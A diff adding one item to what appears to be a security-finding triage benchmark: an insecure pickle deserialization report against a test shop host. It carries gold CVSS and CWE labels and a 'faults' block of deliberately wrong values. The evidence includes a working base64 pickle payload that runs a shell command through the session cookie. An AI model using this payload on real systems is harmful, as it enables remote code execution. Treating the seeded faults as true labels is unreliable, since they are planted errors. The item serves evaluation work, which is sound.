@@ -1,0 +1,30 @@
+{
+  "id": "insecure-deserialization",
+  "split": "dev",
+  "title": "Insecure Python pickle deserialization in session token",
+  "asset": "https://shop.acme.test/api/state",
+  "notes": "Session state parameter in Cookie: state= is passed directly to pickle.loads without verification, enabling remote code execution as web server user.",
+  "evidence": [
+    {
+      "name": "rce-output.txt",
+      "text": "GET /api/state HTTP/1.1\nHost: shop.acme.test\nCookie: state=gASVLgAAAAAAAACMCGJ1aWx0aW5zlIwGc3lzdGVtlJOUjAZpZCA+PiBvdXSUhZRSlC4=\n\nHTTP/1.1 200 OK\nuid=1000(appuser) gid=1000(appuser)"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": [
+      "502"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 9.8,
+    "severity": "Critical"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
